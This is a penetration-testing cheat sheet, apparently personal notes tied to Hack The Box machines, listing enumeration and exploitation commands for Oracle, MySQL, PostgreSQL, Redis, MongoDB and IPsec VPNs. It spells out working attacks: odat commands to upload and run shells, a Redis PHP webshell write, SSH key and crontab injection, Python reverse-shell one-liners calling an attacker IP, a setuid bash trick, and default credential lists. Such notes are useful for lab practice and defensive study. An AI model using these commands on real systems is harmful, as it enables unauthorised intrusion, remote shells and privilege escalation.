+				Exploitation and Enumeration:
+					Odat:(https://github.com/quentinhardy/odat)
+						Installation:
+							1. Installing odat:
+								apt-get install odat
+							2. Installing Oracle instant client basic, Oracle sdk(devel) and Oracle sqlplus:
+								Download .rpm packages from https://www.oracle.com/database/technologies/instant-client/linux-x86-64-downloads.html
+								Convert .rpm to .deb package:
+									Alien:
+										alien packagename.rpm
+										Note:
+											Read Linux Shell Commands Sheet to read more.
+								Install .deb packages:
+									dpkg -i packagename.deb
+						Basics:
+							Modules:(odat has a lot of modules)
+								all => to run all modules
+								Modules to Upload/Download files:
+									1. dbmsadvisior => Only Upload
+									2. utlfile => Upload, Download and Remove
+									3. externaltable => Download and Execute
+								sidguesser => to bruteforce SID
+								passwordguesser => to guess Oracle users password only. You must have a valid SID for running this module.
+								java => to execute system commands on a remote database server
+							Flags:
+								-s => source
+								-d => sid 
+								-p => port (default => 1521)
+								--accounts-file => to specify custom accounts.txt
+								-U username
+								-P password
+								--sysdba => execute the command with privileges of SYSDBA
+								--exec <remotePath> <remoteFilename> => to execute a file
+								--getFile /tmp/ temp.sh test.txt=> to get contents of /tmp/tesh.sh (on target) into test.txt (on attacker's system)
+								--putFile
+								--removeFile
+									Note:
+										Its getFile, not getfile (F is capital)
+										Its getFile, not getfile (F is capital)
+										Its removeFile, not removefile (F is capital)
+								--test-module
+						Bruteforcing SID:
+							./odat.py sidguesser -s <ip>
+						Bruteforcing Accounts:(user:pass)
+							./odat.py passwordguesser -s <ip> -d <sid>
+							./odat.py passwordguesser -s <ip> -d <sid> --accounts-file /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
+								Note:
+									odat uses /opt/odat/accounts/accounts.txt wordlist.
+						Remote Code Execution:
+							Execute Code via Java Stored Procedure:
+							Execute code via Scheduler:
+							Execute code via External Tables:
+							Shells:	
+								Uploading Shells: 3 methods
+									1. ./odat.py utlfile -s <ip> -U user -P pass -d <sid> --sysdba --putfile \\temp name.exe shell.exe => writing a file
+									2. ./oday.py dbmsadvisor -s <ip> -d <sid> -U user -P pass --sysdba --putfile C:\\dir1\\dir2 name.aspx /usr/share/shell.aspx
+									3.maunual file upload: see writeup of HTB:silo
+								Executing Shells:	
+									if its an executable shell:
+										./odat.py externaltable -f <ip> -U user -P pass -d <sid> --sysdba --exec \\temp name.exe
+									if its a webshell:
+										http://ip/shell.ext
+							Uploading/Writing Files:(2 Ways)
+								1. ./odat.py utlfile -s <ip> -U user -P pass -d <sid> --sysdba --putfile \\temp name.exe shell.exe 
+								2. ./oday.py dbmsadvisor -s <ip> -d <sid> -U user -P pass --sysdba --putfile C:\\dir1\\dir2 name.aspx /usr/share/shell.aspx
+							Downloading/Reading Files:(2 Ways)
+								1. ./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --getFile /tmp/ temp.sh test.txt=> to get contents of /tmp/tesh.sh (on target) into test.txt (on attacker's system)
+								2. ./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --test-module --getFile /etc/ passwd passwd.txt
+							Executing File:
+								./odat.py externaltable -f <ip> -U user -P pass -d <sid> --sysdba --exec \\temp name.exe
+					Connecting to orcaleDB:
+						Sqlplus:
+							Installation:
+								From https://github.com/f00b4r/oracle-instantclient.git, download basic, sdk, and sqlplus and unzip them in a single directory.
+								update ~/.zshrc:
+									alias sqlplus='/opt/oracle/instantclient_12_2/sqlplus'
+									export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/didier:/usr/local/go/bin’
+									export SQLPATH=/opt/oracle/instantclient_12_2
+									export TNS_ADMIN=/opt/oracle/instantclient_12_2
+									export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2
+									export ORACLE_HOME=/opt/oracle/instantclient_12_2
+							Usage:
+								Getting a SQL Shell:
+									sqlplus <username>/<password>@<ip_address>/<SID>
+									sqlplus <username>/<password>@<ip_address>:<port>/<SID>
+									sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba' => shell as sysdba
+										SQL> select * from session_privs => show privs
+										SQL> select * from user_role_privs => user privs
+				Used on HTB::Silo
+			MySQL:(3306)
+				Understanding MySQL:
+				Enumeration:
+					Nmap:
+						nmap -sV -Pn -vv  10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122
+					Connecting to MySQL Server:
+						Using MySQL client utility:
+							Usage:
+								mysql -h <ip> -p <password> -u <username>
+								Flags:
+									-h <ip> => host
+									-u => username
+									-p => password
+										We can either pass the password as a param or enter it later on
+									-e "query" => MySQL query
+								Note:
+									Use ; at the end of every line
+			Postgresql:(5432/5433)
+				Understanding Postgresql:
+					Ports:
+						TCP/5432
+						TCP/5433
+				Enumeration:
+					Connecting to it:
+						Default Creds:
+							postgres:postgres
+							postgres:password
+							postgres:admin
+							admin:admin
+							admin:password
+						psql:(sudo apt install postgresql postgresql-client)
+							Basics:
+							Usage:
+								psql -h <host> -p <port> -U <username> -W <password> <database>
+								Flags:
+			CouchDB:(5984/6984)
+				Understanding CouchDB:
+				Enumeration:
+			REDIS:(6379)
+				Understanding REDIS:
+					Officially, Redis is not supported on Windows.
+				Redis-Cli:(apt-get install redis-tools)
+					Basics:
+						This tool is used to get redis shell(similiar to SQL shell)
+					Usage:
+						redis-cli -h host => Anonymous Login
+						redis-cli -h host -p port -a password
+						redis-cli -h host -p port -a "password"
+						Flags:
+							-p port => default port is 6379
+						Once we have a redis shell:
+							We can use redis commands:
+								info => general info
+								config get dir => show current directory
+								config set dir /abcd => cd abcd/
+							we can do either of these depending on situation to get RCE:
+								WebShell:
+									1. config set dir /var/www/html
+									2. config set dbfilename redis.php
+									3. set test "<?php system($_REQUEST['cmd']);?>"
+									4. save
+								SSH:
+									1. Kali> ssh-keygen -t rsa => Generate a ssh key on kali:
+									2. Kali> (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
+									3. Redis> config get * => this will tell us home directory of "redis" user
+									4. Redis> config set dir config set dir /var/lib/redis/.ssh
+									5. kali> cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set crackit
+									6. Redis> config set dbfilename "authorized_keys"
+									7. Redis> save
+									8. Kali> ssh -i id_rsa redis@10.10.10.160
+								CronTab:
+									1. echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
+									2. redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
+									3. redis-cli -h 10.85.0.52 config set dbfilename root
+									4. redis-cli -h 10.85.0.52 save
+									Note:
+										We need either a misconfigured linux target or a redis server running with sudo privileges to exploit this.
+				Used in HTB::Postman
+			InfluxDB:(8086)
+				Understanding InfluxDB:
+				Enumeration:
+			HSQLDB(9001):(HyperSQL DB)
+				Understanding HSQLDB:
+				Enumeration:
+			Cassandra:(9042/9160)
+				Understanding Cassandra:
+				Enumeration:
+			MongoDB:(27017/27018)
+				Understanding MongoDB:
+				Enumeration:
+					Connecting to MongoDB:
+						Using Mongo:(Binary)
+							mongo -u user -p 'pass' ip:port/db
+							mongo -u user -p 'pass' localhost:27017/db
+							Flags:
+								-u => 
+								-p => 
+							Meta-Commands:
+								db => shows curent db name
+								show collections => same as show tables of SQL
+								db.<table_name>.find() => same as "select * from <table_name>" of SQL
+								db.<table_name>.insert({key:"Value"}) => Insering data
+								Uploading a reverse shell into MongoDb table:
+									1. db.<table_name>.insert({key:"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
+									2. db.tasks.insert( { "cmd": "/bin/cp /bin/bash /tmp/tombash; chmod u+s /tmp/tombash;" } );
+		Mailing PPS:
+			SMTP(25):(Simple Mail Transfer Protocol)
+				Read Mail Exploitation Sheet.
+			POP3(110):(Post Office Protocol)
+				Read Mail Exploitation Sheet.
+			IMAP(143):(Internet Message Access Protocol)
+				Read Mail Exploitation Sheet.
+			IMAPS(993):(IMAP Over SSL)
+				Read Mail Exploitation Sheet.
+			POP3S(995):(POP3 Over SSL)
+				Read Mail Exploitation Sheet.
+		VPN PPS:
+			IPsec/IKE:(UDP/500)
+				Understanding IPsec/IKE:
+					IPsec is a standard protocol used for VPN security.
+					IKE:(Internet Key Exchange)
+						Basics:
+							IKE protocol is a type of ISAKMP(Internet Security Association Key Management Protocol) implementation, which is a framework for authentication and key exchange.
+							Versions:
+								A. IKEv1:
+									It was introduced in 1998
+									It continues to be used in situations where IKEv2 would not be feasible.
+								B. IKEv2:
+									It was introduced in 2005
+									It can only be used with route-based VPNs.
+						IKE establishes SA(security association) between two endpoints through a three-phase process:
+							Phase 1:(Establish Channel)
+								It Establish a secure channel between 2 IPsec endpoints using a Pre-Shared Key (PSK) or certificates.
+								It can use either of the two modes to establish the bidirectional SA(security association):
+									Main Mode => uses a six-way handshake where parameters are exchanged in multiple rounds with encrypted authentication information.
+									Aggresive Mode => uses a three-way handshake where the VPN sends the hashed PSK to the client in a single unencrypted message. 
+							Phase 1.5:(Optional)
+								Its also known as Extended Authentication Phase.
+								It authenticates the user that is trying to connect.
+							Phase 2:(Data Protection)
+								Its also known as Quick Phase.
+								It encrypts and transports the data using ESP and AH:
+									ESP:(Encapsulation Security Payload)
+										It provides data confidentiality and integrity, but cannot protect the IP header.
+										The IP protocol number of ESP is 50.
+									AH:(Authentication Header)
+										It provides integrity service to the data packet.
+										The IP protocol number of AH is 51.
+								Both ESP and AH can opeeate in two modes:
+									Transport mode:
+										Provides security services between two hosts, applied to the payload of the IP packet, but the IP headers are left in the clear for routing.
+									Tunneling:
+										The entire IP packet is encrypted and/or authenticated, and it become the payload of a new IP packet with a header to send it to the other end. At the other end, the packet is encrypted and send based on the decrpyted headers						
+							Note:
+								IKEv1 only has Phase1 and Phase2.
+						Important Terms:
+							SA:(Security Association)
+								Its a set of algorithms used to encrypt and authenticate the transmitted data.
+								SA's are mostly represented by keys.
+								Since SA is associated with data transmission in one direction, two-way communications are secured by a pair of security associations(means using two SA's).
+							PSK:(Pre-Shared Keys)
+								A PSK file is used by ike for authentication and is configured on every IPSec peer.
+								Process:
+									The peers authenticate by computing and sending a keyed hash of data that includes the PSK.
+									When the receiving peer (the VPN) is able to create the same hash independently using the PSK it has, confirming that the initiator (the client) has the same PSK, it authenticates the initiating peer.						
+					Transformation:
+						A transformation is a combination of values.
+						Each transform contains a number of attributes like DES or 3DES as the encryption algorithm, SHA or MD5 as the integrity algorithm, a pre-shared key as the authentication type, Diffie-Hellman 1 or 2 as the key distribution algorithm and 28800 seconds as the lifetime.
+						The first thing that you have to do is find a valid transformation, so the server will talk to you.
+				Enumeration:
+					IKE-Scan:
+						Basics:
+							By default, Ike-scan works in main mode, and sends a packet to the gateway with an ISAKMP header and a single proposal with eight transforms inside it.
+						Usage:	
+							ike-scan -M 10.10.10.116 => to get a valid transformation
+								Understanding output:
+									AUTH=<type_of_SA>
+									VID=Vendor ID
+									last line can have either of these three:
+										0 returned handshake; 0 returned notify: 
+											This means the target is not an IPsec gateway.
+										1 returned handshake; 0 returned notify:
+											This means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the transforms you proposed are acceptable (a valid transform will be shown in the output)
+										0 returned handshake; 1 returned notify:
+											VPN gateways respond with a notify message when none of the transforms are acceptable (though some gateways do not, in which case further analysis and a revised proposal should be tried).
+							ike-scan -M --showbackoff 172.16.21.200 => fingerprinting VPN vendor
+							Flags:
+								--ikev2 => force ikev2 
+								-M =>
+								--showbackoff =>
+					ikeprobe:
+						Basics:
+						Usage:
+				Connecting to VPN:
+					Strongswan:(apt install strongswan)
+						Basics:
+							Configuration files:
+								edit /etc/ipsec.secrets:
+									%any : PSK "password"
+									Note:	
+										This password is cracked from psk
+								edit /etc/ipsec.conf:
+									# ipsec.conf - strongSwan IPsec configuration file
+
+									config setup
+									    charondebug="all" =>  be more verbose to help me troubleshoot the connection.
+									    uniqueids=yes
+									    strictcrlpolicy=no
+
+									conn name_abcd
+									    authby=secret
+									    auto=add
+									    ike=3des-sha1-modp1024!
+									    esp=3des-sha1!
+									    type=transport => use ipsec transport mode to connect host to host.
+									    keyexchange=ikev1
+									    left=10.10.14.15
+									    right=10.10.10.116
+									    rightsubnet=10.10.10.116[tcp]
+									Note:
+										ike, esp, and keyexchange are set based on information from ike-scan
+										left and right represent my computer and the target computer.
+						Usage:
+							service strongswan restart
+							ipsec restart 
+							ipsec up name_abcd
+				Used in HTB::Conceal
+		Printing PPS:
+			LPD(515):(Line Printer Daemon)
+				Read Printer Exploitation Sheet
+			IPP(631):(Internet Printing Protocol)
+				Read Printer Exploitation Sheet
+			Raw Printing(9100):(aka JetDirect/AppSocket/PDL-datastream)
+				Read Printer Exploitation Sheet
+PORT Knocking:
+	Basics:
+		if some port(INITIAL PORT) is CLOSED, we knock some other ports to see if the INITIAL PORT opens up.
+	Exploitation:
+		Nmap:
+			for x in $(echo 22 23 24);do nmap -PN --host-timeout 201 --max-retries 0 -r -p$x 192.168.0.106;done
+		KnockD:(apt-get install knockd)
+			Basics:
+			Usage:
+				knock <ip> port,port -----
+				nmap -p<Initial_port> <ip>
+				Flags:
